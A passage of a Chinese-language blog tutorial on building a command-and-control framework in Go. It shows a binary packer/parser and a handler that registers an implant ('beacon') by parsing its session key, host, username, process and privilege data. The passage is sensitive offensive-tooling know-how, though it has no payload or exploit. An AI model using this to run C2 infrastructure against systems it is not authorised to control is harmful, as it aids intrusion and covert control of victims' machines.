class="string">`json:&quot;b_killdate&quot;`</span>  </span><br><span class="line">    WorkingTime  <span class="type">int</span>    <span class="string">`json:&quot;b_workingtime&quot;`</span>  </span><br><span class="line">    Tags         <span class="type">string</span> <span class="string">`json:&quot;b_tags&quot;`</span>  </span><br><span class="line">    Mark         <span class="type">string</span> <span class="string">`json:&quot;b_mark&quot;`</span>  </span><br><span class="line">    Color        <span class="type">string</span> <span class="string">`json:&quot;b_color&quot;`</span>  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>handler/beacon/beacon_main.go</code>：实现BeaconCreate</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *BeaconHandler)</span></span> BeaconCreate(beat []<span class="type">byte</span>) (response.BeaconData, <span class="type">error</span>) &#123;  </span><br><span class="line">    <span class="keyword">return</span> b.CreateBeacon(beat)  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>既然都说到了打包了，那肯定是有相应的解包操作，解包器的方法如下</p>
<table>
<thead>
<tr>
<th>方法</th>
<th>读取规则（大端）</th>
<th>移动</th>
<th>越界行为</th>
</tr>
</thead>
<tbody><tr>
<td><code>ParseInt8</code></td>
<td>1字节 → <code>uint8</code></td>
<td>缓冲向前滑1B</td>
<td>返回 0</td>
</tr>
<tr>
<td><code>ParseInt16</code></td>
<td>2字节 → <code>uint16</code></td>
<td>缓冲向前滑2B</td>
<td>返回 0</td>
</tr>
<tr>
<td><code>ParseInt32</code></td>
<td>4字节 → <code>uint</code></td>
<td>缓冲向前滑4B</td>
<td>返回 0</td>
</tr>
<tr>
<td><code>ParseInt64</code></td>
<td>8字节 → <code>uint64</code></td>
<td>缓冲向前滑8B</td>
<td>返回 0</td>
</tr>
<tr>
<td><code>ParseBytes</code></td>
<td>先 <code>ParseInt32</code> 取长度N，再读N字节</td>
<td>缓冲向前滑4B+N</td>
<td>空切片</td>
</tr>
<tr>
<td><code>ParseString</code></td>
<td>同上，但<strong>去掉末尾0x00</strong></td>
<td>缓冲向前滑4B+N</td>
<td>空串</td>
</tr>
<tr>
<td><code>ParseString64</code></td>
<td>用8字节长度字段</td>
<td>缓冲向前滑8B+N</td>
<td>空串</td>
</tr>
</tbody></table>
<p>解析器除了解包相关的方法之外，还有一个Check方法，在不真正消费（不移动读指针）的情况下，验证后续字节流能否按给定类型序列完整解析一遍，比如说给定检验序列：{“int8”，”int64”, “array”}，做预处理：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 先用 Check 做“预算”</span></span><br><span class="line"><span class="keyword">if</span> !parser.Check([]<span class="type">string</span>&#123;<span class="string">&quot;int8&quot;</span>,<span class="string">&quot;int64&quot;</span>,<span class="string">&quot;array&quot;</span>&#125;) &#123;</span><br><span class="line">    <span class="keyword">return</span> errors.New(<span class="string">&quot;数据包长度不足&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>handler/beacon/beacon_packet.go</code>：包含打包和解包器的相关方法</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> beacon  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> (  </span><br><span class="line">    <span class="string">&quot;bytes&quot;</span>  </span><br><span class="line">    <span class="string">&quot;encoding/binary&quot;</span>    </span><br><span class="line">    <span class="string">&quot;errors&quot;</span>    </span><br><span class="line">    <span class="string">&quot;strings&quot;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">type</span> Parser <span class="keyword">struct</span> &#123;  </span><br><span class="line">    buffer []<span class="type">byte</span>  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">CreateParser</span><span class="params">(buffer []<span class="type">byte</span>)</span></span> *Parser &#123;  </span><br><span class="line">    <span class="keyword">return</span> &amp;Parser&#123;  </span><br><span class="line">       buffer: buffer,  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *Parser)</span></span> Size() <span class="type">uint</span> &#123;  </span><br><span class="line">    <span class="keyword">return</span> <span class="type">uint</span>(<span class="built_in">len</span>(p.buffer))  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *Parser)</span></span> Check(types []<span class="type">string</span>) <span class="type">bool</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    packerSize := p.Size()  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">for</span> _, t := <span class="keyword">range</span> types &#123;  </span><br><span class="line">       <span class="keyword">switch</span> t &#123;  </span><br><span class="line">  </span><br><span class="line">       <span class="keyword">case</span> <span class="string">&quot;byte&quot;</span>:  </span><br><span class="line">          <span class="keyword">if</span> packerSize &lt; <span class="number">1</span> &#123;  </span><br><span class="line">             <span class="keyword">return</span> <span class="literal">false</span>  </span><br><span class="line">          &#125;  </span><br><span class="line">          packerSize -= <span class="number">1</span>  </span><br><span class="line">  </span><br><span class="line">       <span class="keyword">case</span> <span class="string">&quot;int16&quot;</span>:  </span><br><span class="line">          <span class="keyword">if</span> packerSize &lt; <span class="number">2</span> &#123;  </span><br><span class="line">             <span class="keyword">return</span> <span class="literal">false</span>  </span><br><span class="line">          &#125;  </span><br><span class="line">          packerSize -= <span class="number">2</span>  </span><br><span class="line">  </span><br><span class="line">       <span class="keyword">case</span> <span class="string">&quot;int32&quot;</span>:  </span><br><span class="line">          <span class="keyword">if</span> packerSize &lt; <span class="number">4</span> &#123;  </span><br><span class="line">             <span class="keyword">return</span> <span class="literal">false</span>  </span><br><span class="line">          &#125;  </span><br><span class="line">          packerSize -= <span class="number">4</span>  </span><br><span class="line">  </span><br><span class="line">       <span class="keyword">case</span> <span class="string">&quot;int64&quot;</span>:  </span><br><span class="line">          <span class="keyword">if</span> packerSize &lt; <span class="number">8</span> &#123;  </span><br><span class="line">             <span class="keyword">return</span> <span class="literal">false</span>  </span><br><span class="line">          &#125;  </span><br><span class="line">          packerSize -= <span class="number">8</span>  </span><br><span class="line">  </span><br><span class="line">       <span class="keyword">case</span> <span class="string">&quot;array&quot;</span>:  </span><br><span class="line">          <span class="keyword">if</span> packerSize &lt; <span class="number">4</span> &#123;  </span><br><span class="line">             <span class="keyword">return</span> <span class="literal">false</span>  </span><br><span class="line">          &#125;  </span><br><span class="line">  </span><br><span class="line">          index := p.Size() - packerSize  </span><br><span class="line">          value := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">4</span>)  </span><br><span class="line">          <span class="built_in">copy</span>(value, p.buffer[index:index+<span class="number">4</span>])  </span><br><span class="line">          length := <span class="type">uint</span>(binary.BigEndian.Uint32(value))  </span><br><span class="line">          packerSize -= <span class="number">4</span>  </span><br><span class="line">  </span><br><span class="line">          <span class="keyword">if</span> packerSize &lt; length &#123;  </span><br><span class="line">             <span class="keyword">return</span> <span class="literal">false</span>  </span><br><span class="line">          &#125;  </span><br><span class="line">          packerSize -= length  </span><br><span class="line">       &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *Parser)</span></span> ParseInt8() <span class="type">uint8</span> &#123;  </span><br><span class="line">    <span class="keyword">var</span> value = <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">1</span>)  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> p.Size() &gt;= <span class="number">1</span> &#123;  </span><br><span class="line">       <span class="keyword">if</span> p.Size() == <span class="number">1</span> &#123;  </span><br><span class="line">          <span class="built_in">copy</span>(value, p.buffer[:p.Size()])  </span><br><span class="line">          p.buffer = []<span class="type">byte</span>&#123;&#125;  </span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">          <span class="built_in">copy</span>(value, p.buffer[:<span class="number">1</span>])  </span><br><span class="line">          p.buffer = p.buffer[<span class="number">1</span>:]  </span><br><span class="line">       &#125;  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> <span class="number">0</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> value[<span class="number">0</span>]  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *Parser)</span></span> ParseInt16() <span class="type">uint16</span> &#123;  </span><br><span class="line">    <span class="keyword">var</span> value = <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">2</span>)  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> p.Size() &gt;= <span class="number">2</span> &#123;  </span><br><span class="line">       <span class="keyword">if</span> p.Size() == <span class="number">2</span> &#123;  </span><br><span class="line">          <span class="built_in">copy</span>(value, p.buffer[:p.Size()])  </span><br><span class="line">          p.buffer = []<span class="type">byte</span>&#123;&#125;  </span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">          <span class="built_in">copy</span>(value, p.buffer[:<span class="number">2</span>])  </span><br><span class="line">          p.buffer = p.buffer[<span class="number">2</span>:]  </span><br><span class="line">       &#125;  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> <span class="number">0</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> binary.BigEndian.Uint16(value)  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *Parser)</span></span> ParseInt32() <span class="type">uint</span> &#123;  </span><br><span class="line">    <span class="keyword">var</span> value = <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">4</span>)  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> p.Size() &gt;= <span class="number">4</span> &#123;  </span><br><span class="line">       <span class="keyword">if</span> p.Size() == <span class="number">4</span> &#123;  </span><br><span class="line">          <span class="built_in">copy</span>(value, p.buffer[:p.Size()])  </span><br><span class="line">          p.buffer = []<span class="type">byte</span>&#123;&#125;  </span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">          <span class="built_in">copy</span>(value, p.buffer[:<span class="number">4</span>])  </span><br><span class="line">          p.buffer = p.buffer[<span class="number">4</span>:]  </span><br><span class="line">       &#125;  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> <span class="number">0</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> <span class="type">uint</span>(binary.BigEndian.Uint32(value))  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *Parser)</span></span> ParseInt64() <span class="type">uint64</span> &#123;  </span><br><span class="line">    <span class="keyword">var</span> value = <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">8</span>)  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> p.Size() &gt;= <span class="number">8</span> &#123;  </span><br><span class="line">       <span class="keyword">if</span> p.Size() == <span class="number">8</span> &#123;  </span><br><span class="line">          <span class="built_in">copy</span>(value, p.buffer[:p.Size()])  </span><br><span class="line">          p.buffer = []<span class="type">byte</span>&#123;&#125;  </span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">          <span class="built_in">copy</span>(value, p.buffer[:<span class="number">8</span>])  </span><br><span class="line">          p.buffer = p.buffer[<span class="number">8</span>:]  </span><br><span class="line">       &#125;  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> <span class="number">0</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> binary.BigEndian.Uint64(value)  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *Parser)</span></span> ParseBytes() []<span class="type">byte</span> &#123;  </span><br><span class="line">    size := p.ParseInt32()  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> p.Size() &lt; size &#123;  </span><br><span class="line">       <span class="keyword">return</span> <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">0</span>)  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">       b := p.buffer[:size]  </span><br><span class="line">       p.buffer = p.buffer[size:]  </span><br><span class="line">       <span class="keyword">return</span> b  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *Parser)</span></span> ParseString() <span class="type">string</span> &#123;  </span><br><span class="line">    size := p.ParseInt32()  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> p.Size() &lt; size &#123;  </span><br><span class="line">       <span class="keyword">return</span> <span class="string">&quot;&quot;</span>  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">       b := p.buffer[:size]  </span><br><span class="line">       p.buffer = p.buffer[size:]  </span><br><span class="line">       <span class="keyword">return</span> <span class="type">string</span>(bytes.Trim(b, <span class="string">&quot;\x00&quot;</span>))  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *Parser)</span></span> ParseString64() <span class="type">string</span> &#123;  </span><br><span class="line">    size := p.ParseInt64() <span class="comment">// 读取8字节长度  </span></span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> p.Size() &lt; <span class="type">uint</span>(size) &#123;  </span><br><span class="line">       <span class="keyword">return</span> <span class="string">&quot;&quot;</span>  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">       b := p.buffer[:size]  </span><br><span class="line">       p.buffer = p.buffer[size:]  </span><br><span class="line">       <span class="keyword">return</span> <span class="type">string</span>(bytes.Trim(b, <span class="string">&quot;\x00&quot;</span>))  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">PackArray</span><span class="params">(array []any)</span></span> ([]<span class="type">byte</span>, <span class="type">error</span>) &#123;  </span><br><span class="line">    <span class="keyword">var</span> packData []<span class="type">byte</span>  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">for</span> i := <span class="keyword">range</span> array &#123;  </span><br><span class="line">       <span class="keyword">switch</span> v := array[i].(<span class="keyword">type</span>) &#123;  </span><br><span class="line">  </span><br><span class="line">       <span class="keyword">case</span> []<span class="type">byte</span>:  </span><br><span class="line">          packData = <span class="built_in">append</span>(packData, v...)  </span><br><span class="line">          <span class="keyword">break</span>  </span><br><span class="line">  </span><br><span class="line">       <span class="keyword">case</span> <span class="type">string</span>:  </span><br><span class="line">          size := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">4</span>)  </span><br><span class="line">          val := v  </span><br><span class="line">          <span class="keyword">if</span> <span class="built_in">len</span>(val) != <span class="number">0</span> &#123;  </span><br><span class="line">             <span class="keyword">if</span> !strings.HasSuffix(val, <span class="string">&quot;\x00&quot;</span>) &#123;  </span><br><span class="line">                val += <span class="string">&quot;\x00&quot;</span>  </span><br><span class="line">             &#125;  </span><br><span class="line">          &#125;  </span><br><span class="line">          binary.BigEndian.PutUint32(size, <span class="type">uint32</span>(<span class="built_in">len</span>(val)))  </span><br><span class="line">          packData = <span class="built_in">append</span>(packData, size...)  </span><br><span class="line">          packData = <span class="built_in">append</span>(packData, []<span class="type">byte</span>(val)...)  </span><br><span class="line">          <span class="keyword">break</span>  </span><br><span class="line">  </span><br><span class="line">       <span class="keyword">case</span> <span class="type">int8</span>:  </span><br><span class="line">          packData = <span class="built_in">append</span>(packData, <span class="type">byte</span>(v))  </span><br><span class="line">          <span class="keyword">break</span>  </span><br><span class="line">  </span><br><span class="line">       <span class="keyword">case</span> <span class="type">int16</span>:  </span><br><span class="line">          num := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">2</span>)  </span><br><span class="line">          binary.BigEndian.PutUint16(num, <span class="type">uint16</span>(v))  </span><br><span class="line">          packData = <span class="built_in">append</span>(packData, num...)  </span><br><span class="line">          <span class="keyword">break</span>  </span><br><span class="line">  </span><br><span class="line">       <span class="keyword">case</span> <span class="type">int32</span>:  </span><br><span class="line">          num := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">4</span>)  </span><br><span class="line">          binary.BigEndian.PutUint32(num, <span class="type">uint32</span>(v))  </span><br><span class="line">          packData = <span class="built_in">append</span>(packData, num...)  </span><br><span class="line">          <span class="keyword">break</span>  </span><br><span class="line">  </span><br><span class="line">       <span class="keyword">case</span> <span class="type">int64</span>:  </span><br><span class="line">          num := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">8</span>)  </span><br><span class="line">          binary.BigEndian.PutUint64(num, <span class="type">uint64</span>(v))  </span><br><span class="line">          packData = <span class="built_in">append</span>(packData, num...)  </span><br><span class="line">          <span class="keyword">break</span>  </span><br><span class="line">  </span><br><span class="line">       <span class="keyword">case</span> <span class="type">bool</span>:  </span><br><span class="line">          <span class="keyword">var</span> bt <span class="type">byte</span> = <span class="number">0</span>  </span><br><span class="line">          <span class="keyword">if</span> v &#123;  </span><br><span class="line">             bt = <span class="number">1</span>  </span><br><span class="line">          &#125;  </span><br><span class="line">          packData = <span class="built_in">append</span>(packData, bt)  </span><br><span class="line">          <span class="keyword">break</span>  </span><br><span class="line">  </span><br><span class="line">       <span class="keyword">default</span>:  </span><br><span class="line">          <span class="keyword">return</span> <span class="literal">nil</span>, errors.New(<span class="string">&quot;PackArray unknown type&quot;</span>)  </span><br><span class="line">       &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> packData, <span class="literal">nil</span>  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>handler/beacon/beacon_handler.go</code>：CreateBeacon方法，具体创建（注册）Beacon的相关代码</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *BeaconHandler)</span></span> CreateBeacon(initialData []<span class="type">byte</span>) (response.BeaconData, <span class="type">error</span>) &#123;  </span><br><span class="line">    <span class="keyword">var</span> beacon response.BeaconData  </span><br><span class="line">  </span><br><span class="line">    parser := CreateParser(initialData)  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> <span class="literal">false</span> == parser.Check([]<span class="type">string</span>&#123;<span class="string">&quot;int32&quot;</span>, <span class="string">&quot;int32&quot;</span>, <span class="string">&quot;int32&quot;</span>, <span class="string">&quot;int32&quot;</span>, <span class="string">&quot;int32&quot;</span>, <span class="string">&quot;int32&quot;</span>, <span class="string">&quot;int32&quot;</span>, <span class="string">&quot;int16&quot;</span>, <span class="string">&quot;int16&quot;</span>, <span class="string">&quot;int32&quot;</span>, <span class="string">&quot;byte&quot;</span>, <span class="string">&quot;byte&quot;</span>, <span class="string">&quot;int32&quot;</span>, <span class="string">&quot;byte&quot;</span>, <span class="string">&quot;array&quot;</span>, <span class="string">&quot;array&quot;</span>, <span class="string">&quot;array&quot;</span>, <span class="string">&quot;array&quot;</span>, <span class="string">&quot;array&quot;</span>&#125;) &#123;  </span><br><span class="line">       <span class="keyword">return</span> beacon, errors.New(<span class="string">&quot;error beacon data&quot;</span>)  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    beacon.Sleep = parser.ParseInt32()  </span><br><span class="line">    beacon.Jitter = parser.ParseInt32()  </span><br><span class="line">    beacon.KillDate = <span class="type">int</span>(parser.ParseInt32())  </span><br><span class="line">    beacon.WorkingTime = <span class="type">int</span>(parser.ParseInt32())  </span><br><span class="line">    beacon.ACP = <span class="type">int</span>(parser.ParseInt32())  </span><br><span class="line">    beacon.OemCP = <span class="type">int</span>(parser.ParseInt32())  </span><br><span class="line">    beacon.GmtOffset = <span class="type">int</span>(parser.ParseInt32())  </span><br><span class="line">    beacon.Pid = fmt.Sprintf(<span class="string">&quot;%v&quot;</span>, parser.ParseInt16())  </span><br><span class="line">    beacon.Tid = fmt.Sprintf(<span class="string">&quot;%v&quot;</span>, parser.ParseInt16())  </span><br><span class="line">  </span><br><span class="line">    buildNumber := parser.ParseInt32()  </span><br><span class="line">    majorVersion := parser.ParseInt8()  </span><br><span class="line">    minorVersion := parser.ParseInt8()  </span><br><span class="line">    internalIp := parser.ParseInt32()  </span><br><span class="line">    flag := parser.ParseInt8()  </span><br><span class="line">  </span><br><span class="line">    beacon.Arch = <span class="string">&quot;x32&quot;</span>  </span><br><span class="line">    <span class="keyword">if</span> (flag &amp; <span class="number">0</span>b00000001) &gt; <span class="number">0</span> &#123;  </span><br><span class="line">       beacon.Arch = <span class="string">&quot;x64&quot;</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    systemArch := <span class="string">&quot;x32&quot;</span>  </span><br><span class="line">    <span class="keyword">if</span> (flag &amp; <span class="number">0</span>b00000010) &gt; <span class="number">0</span> &#123;  </span><br><span class="line">       systemArch = <span class="string">&quot;x64&quot;</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    beacon.Elevated = <span class="literal">false</span>  </span><br><span class="line">    <span class="keyword">if</span> (flag &amp; <span class="number">0</span>b00000100) &gt; <span class="number">0</span> &#123;  </span><br><span class="line">       beacon.Elevated = <span class="literal">true</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    IsServer := <span class="literal">false</span>  </span><br><span class="line">    <span class="keyword">if</span> (flag &amp; <span class="number">0</span>b00001000) &gt; <span class="number">0</span> &#123;  </span><br><span class="line">       IsServer = <span class="literal">true</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    beacon.InternalIP = int32ToIPv4(internalIp)  </span><br><span class="line">    beacon.Os, beacon.OsDesc = GetOsVersion(majorVersion, minorVersion, buildNumber, IsServer, systemArch)  </span><br><span class="line">  </span><br><span class="line">    beacon.SessionKey = parser.ParseBytes()  </span><br><span class="line">    beacon.Domain = <span class="type">string</span>(parser.ParseBytes())  </span><br><span class="line">    beacon.Computer = <span class="type">string</span>(parser.ParseBytes())  </span><br><span class="line">    beacon.Username = ConvertCpToUTF8(<span class="type">string</span>(parser.ParseBytes()), beacon.ACP)  </span><br><span class="line">    beacon.Process = ConvertCpToUTF8(<span class="type">string</span>(parser.ParseBytes()), beacon.ACP)  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> beacon, <span class="literal">nil</span>  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

